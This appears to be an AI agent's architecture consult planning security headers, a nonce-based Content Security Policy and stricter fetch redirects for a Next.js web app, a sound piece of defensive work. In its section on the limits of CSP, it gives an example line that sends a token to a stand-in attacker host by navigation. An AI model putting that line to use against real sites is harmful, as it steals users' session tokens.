# SIM-027 consult (software-architect): security headers, CSP and `redirect: "error"`

There is no proxy file yet, and `next.config.ts` sets no headers. My main recommendation: put the plain headers in `next.config.ts`, and put the CSP in a new `src/proxy.ts` with a per-request nonce and `'strict-dynamic'`. Hashes cannot cover Next's own inline scripts, so a hash-only CSP is not workable (Finding 2). The nonce makes every page render per request. That costs little here because all pages are client shells.

## Findings

1. **Current state** (read only, nothing run):
   - `next.config.ts` sets only `output: "standalone"`, `poweredByHeader: false`, `reactStrictMode` and `agentRules`. There is no `headers()` and no `src/proxy.*` or `src/middleware.*`.
   - **Inline scripts and external assets:**
     - `src/app/layout.tsx:21` renders `THEME_INIT_SCRIPT` inline. It is a constant string (`src/lib/theme.ts:37`).
     - Manrope comes through `next/font/google`, which downloads it at build time, so it is served from `'self'`.
     - The Material Symbols icon font is a `<link>` to `fonts.googleapis.com`, and its font files come from `fonts.gstatic.com` (`src/lib/icons.ts:29`).
   - **Turnstile:** `src/ui/auth/turnstile.ts:16-39` adds `https://challenges.cloudflare.com/turnstile/v0/api.js` at runtime with `createElement`. This matters: under `'strict-dynamic'` a script added that way is trusted without a nonce of its own. Turnstile also renders an iframe from the same host.
   - **Identity origin:** in production it is always `IDENTITY_BASE_PROD = https://api.mmlabs.online/api/v1` (`src/lib/identity/config.ts:3,14-16`). The dev override only applies outside production. So the production CSP can be fixed and computed from `identityBaseFrom(...)` by taking `new URL(...).origin`. Every Identity call goes to that one origin (`identityClient.ts` `post`/`get`), including SIM-007.2's new cookie-mode GET `/auth/orgs`. An origin-only `connect-src` source covers it with no change.
   - **Rendering:** every page except `/sign-in` and `/dev/shell` is static (no `headers()`, `connection()` or `dynamic` export). Only API routes are `force-dynamic`.
   - **Email-link tokens** are read from `#token=` and removed from the address bar (`src/lib/identity/email-link.ts`). Fragments are never sent in `Referer`, so Referrer-Policy is not protecting a token here.
   - **Forms** are `method="post"` with an `onSubmit` handler. Nothing posts a form to Identity; all Identity calls are `fetch`.
   - **`apiFetch`** (`src/lib/api/fetch.ts:52`) calls `fetchFn(input, { ...init, headers, cache: "no-store" })` with no `redirect` option. The Identity client's `post` and `get` (`identityClient.ts:64,93`) don't set one either. The server-side JWKS fetch already uses `redirect: "error"` (SIM-005).
   - **Layer guard:** `scripts/check-layers.mjs:28-33` assigns no layer to `src/proxy.ts`, so a new proxy file would not be checked at all.
   - **Existing scripted check:** `scripts/check-image.sh` already starts the built image without network and fetches pages from inside the container (`probe`, lines 84-87). It runs in both `ci.yml:88` and `release.yml:110`.

2. **Hash vs nonce.** Next App Router pages contain many inline `self.__next_f.push(...)` scripts whose content changes per page and per build, so they cannot be hashed. Once a policy contains any hash or nonce, browsers ignore `'unsafe-inline'`. That leaves two real options:
   - **(A) Static CSP in `next.config.ts` with `script-src 'self' 'unsafe-inline'`.**
     - Gain: pages stay static and it is simple.
     - Give up: no protection against injected inline script, which is the XSS case the ticket goal is about.
     - Still useful: `frame-ancestors`, `connect-src` (limits `fetch` exfiltration), `object-src` and `base-uri`.
   - **(B) Nonce plus `'strict-dynamic'`, set in `src/proxy.ts`.** This follows the Next 16 recipe: the proxy puts the CSP on both the request and the response and passes the nonce in an `x-nonce` request header. Next then adds the nonce to its own scripts, but only on pages rendered per request.
     - Cost: every HTML page becomes dynamic. These pages are thin client shells, traffic is low, and the server is self-hosted, so the cost is small.
     - Side effects: HTML is served `no-store` (no full-route cache, weaker back/forward cache).
   - **Theme script under (B):**
     - Recommended: give it the nonce by reading `(await headers()).get("x-nonce")` in the root layout. This also forces every page to render per request, so one mechanism covers both needs.
     - Alternative: a build-time hash of the constant script. It avoids passing the nonce into the layout, but something else would then have to force pages to render per request.

3. **Where each header lives** (`next.config.ts` and `src/proxy.*` are both High paths, so the plan gate applies either way):
   - **`next.config.ts` `headers()` on `/:path*`** (pages, API and `/_next/static`):
     - `X-Content-Type-Options: nosniff`
     - `X-Frame-Options: DENY`
     - `Referrer-Policy: strict-origin-when-cross-origin`
     - `Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=(), usb=()`
     - optionally `Cross-Origin-Opener-Policy: same-origin`
   - **`src/proxy.ts`:** only the document CSP. Its matcher must exclude `api`, `_next/static`, `_next/image` and `favicon`.
   - **Never set the CSP in both places.** Two CSP headers are both enforced, so pages would get the stricter combination and break. The header check must catch this.

4. **Suggested CSP for (B)**, built by a pure function in `src/lib/security/csp.ts`:
   ```
   default-src 'self';
   script-src 'self' 'nonce-X' 'strict-dynamic' https://challenges.cloudflare.com;
   style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
   font-src 'self' https://fonts.gstatic.com;
   img-src 'self' data: blob:;
   connect-src 'self' https://api.mmlabs.online;
   frame-src https://challenges.cloudflare.com;
   frame-ancestors 'none';
   form-action 'self';
   base-uri 'none';
   object-src 'none'
   ```
   - In dev, add `'unsafe-eval'` to `script-src` (React dev needs it).
   - Keep the nonce out of `style-src`; otherwise `'unsafe-inline'` stops applying and React `style={}` attributes break.
   - For API JSON responses, `default-src 'none'; frame-ancestors 'none'` is optional, low-cost hardening.

5. **Limit of any CSP.** Even with (B), an XSS can still send the token out by navigating (`location = "https://evil/?t=…"`); CSP has no control for that since `navigate-to` was dropped. The ticket goal says an XSS "cannot expose the in-memory token", which overstates it. CSP reduces exposure; it does not rule it out.

## Recommendations

- **R-a (AC1): use option (B).**
  - Add `src/proxy.ts` (Next 16 name, Node runtime, works in the standalone build) that creates a nonce with `crypto.randomUUID()` turned into base64, builds the CSP with `buildCsp({ nonce, identityOrigin, dev })`, and sets it on both the request and the response.
  - The root layout reads `x-nonce` and puts it on the theme `<script>`.
  - Add the static headers to `next.config.ts`.
  - Unit-test `buildCsp`: Identity origin only (no `/api/v1` path), Turnstile in both `script-src` and `frame-src`, no `'unsafe-inline'` in `script-src`, `'unsafe-eval'` in dev only.
  - Pass `identityBaseFrom(process.env.NEXT_PUBLIC_MM_IDENTITY_BASE, production)` to get the origin, so the CSP and the client share one source.
- **R-b (R1): give `src/proxy.ts` its own layer in `check-layers.mjs`** that may import only `lib`, and add a case to `check-layers.test.ts`. Otherwise the new file escapes the R1 guard.
- **R-c (AC1, D2 "no browser test library"): add `scripts/check-headers.mjs <baseUrl>`**, built only on Node's `fetch`. Keep its parsing pure and unit-tested in the style of `check-layers.test.ts`. Run it inside `check-image.sh`'s smoke step with `docker exec -i "$NAME" node --input-type=module - http://127.0.0.1:3000 < scripts/check-headers.mjs`, so it checks the real image in both CI and release. It should check:
  - **Which responses:** `/`, `/sign-in`, `/sign-up`, `/forgot-password`, `/reset-password`, `/verify-email`, `/rooms`, an unknown path (404), `/api/healthz`, and one `/_next/static` asset.
  - **The CSP itself:** exactly one CSP header on HTML responses, and none in Report-Only form. It must contain Turnstile in `script-src` and `frame-src`, the Identity origin in `connect-src`, `frame-ancestors 'none'`, and no `'unsafe-inline'` in `script-src`.
  - **The nonce:** it differs between two requests to the same page, and every `<script>` tag in the HTML (including the theme script, found by `dataset.theme`) has `nonce` equal to the CSP nonce. This catches a page that was left static, which would show as a white screen.
  - **The static headers** on every response, including `/api/*` and `/_next/static`.

  Turnstile and the sign-in flow working under the CSP can't be checked by script. Leave that as Ming's manual browser check from the test plan (watch the DevTools console for CSP violations), and add it to `work/ming-todo.md`.
- **R-d (AC2): set `redirect: "error"` after the spread in `send`.** Write it as `{ ...init, headers, cache: "no-store", redirect: "error" }` so a caller cannot override it.
  - Test: the mock `fetchFn` sees `redirect === "error"` on both the first send and the retry, even when the caller's `init` says `redirect: "follow"`.
  - Test: a rejected fetch propagates as is, with no `onAuthLost` call (keeps AUT-02).
- **R-e (AC3): add the rule to the simap CLAUDE.md Rules, e.g. as R7:** "Route handlers return 401/403 (`unauthenticated`/`forbidden`/`member_deactivated`/`org_required`) only from the auth wrapper, never after a side effect; domain refusals use 409/422 (`not_allowed`)." Optionally cross-reference it in `src/lib/api/error.ts`.
- **R-f (R4, SIM-007.2): don't change `identityClient.ts` in this ticket.** SIM-007.2 edits that file (merge hotspot). Adding `redirect: "error"` to Identity `post`/`get` should be a `debt` issue to do after SIM-007.2 merges. The CSP needs no change for `/auth/orgs`.

## Risks

1. **A page that is not rendered per request gets a blank screen.** Under a nonce CSP its scripts carry no nonce and are all blocked. Reading `headers()` in the root layout covers everything, including `not-found`. A later page or layout that sets `dynamic = "force-static"` would break silently, which is why the per-script nonce check in R-c matters.
2. **Nonce attribute and hydration.** Browsers hide the `nonce` value from the DOM, so React may warn about a mismatch on the theme `<script>`. Check in dev; if needed, add `suppressHydrationWarning` on that script.
3. **Turnstile under strict CSP.** It may need more than `script-src` and `frame-src` (some setups also need `connect-src https://challenges.cloudflare.com`). `Referrer-Policy: no-referrer` has been reported to break Turnstile's hostname check, which is why I recommend `strict-origin-when-cross-origin`. Confirm both in Ming's manual check.
4. **Lost caching.** HTML is no longer cached, and `/_next/static` is unaffected. That's fine at simap's scale, but it reverses SIM-004's mostly-static assumption. Note it in the plan.
5. **The dev server under the CSP** needs `'unsafe-eval'`, and the HMR websocket is covered by `'self'` in current browsers. If dev and prod policies drift, problems would only show up in prod. The scripted check runs against the production build only.
6. **Batch merge order.** SIM-027 touches `src/app/layout.tsx`, `next.config.ts`, `src/proxy.ts`, `fetch.ts`, `check-layers.mjs`, `check-image.sh` and `CLAUDE.md`. If R-f is kept, none of these overlap SIM-007.2's files. Only `CLAUDE.md` might overlap another ticket's change.

## Open questions (batch for Ming)

1. **Option (B) nonce or (A) static `'unsafe-inline'`?** Default: (B). It is the only option that actually blocks injected script, and the per-request rendering cost is small here.
2. **HSTS: where does TLS end for simap, and should the app send `Strict-Transport-Security`?** Default: the app sends `max-age=31536000` without `includeSubDomains`/`preload`. Those two would affect all of `mmlabs.online` and are hard to undo, so Ming decides them.
3. **Report-only first?** Default: no. Ship the enforcing CSP; the scripted check plus Ming's browser check before SIM-021 go-live replace a report-only period (there is no report endpoint anyway).
4. **`redirect: "error"` for the Identity client:** in this ticket or a follow-up? Default: a `debt` follow-up after SIM-007.2 merges (R4, merge hotspot).
5. **Reword the ticket goal from "cannot expose" to "restricts exfiltration of" the token?** Default: yes. CSP cannot block exfiltration by navigation.

## Files

- work/tickets/SIM-027/ticket.md
- next.config.ts
- src/app/layout.tsx
- src/lib/theme.ts
- src/lib/icons.ts
- src/lib/identity/config.ts
- src/lib/identity/email-link.ts
- src/lib/api/fetch.ts
- src/ui/auth/identityClient.ts
- src/ui/auth/turnstile.ts
- src/ui/auth/runtime.ts
- scripts/check-layers.mjs
- scripts/check-image.sh

**Inputs for the plan:**
- work/tickets/SIM-001/security-review.md (item 6)
- work/tickets/SIM-003/plan.md (follow-up 3)
- work/tickets/SIM-004/consult-software-architect.md (CSP note)
- work/tickets/SIM-004/plan.md (Q2)
- work/tickets/SIM-006/security-review.md (notes 1 and 2)
- work/tickets/SIM-006.2/plan.md (Δ7)
- work/tickets/SIM-006.2/security-review.md (note 4 and the closing section)
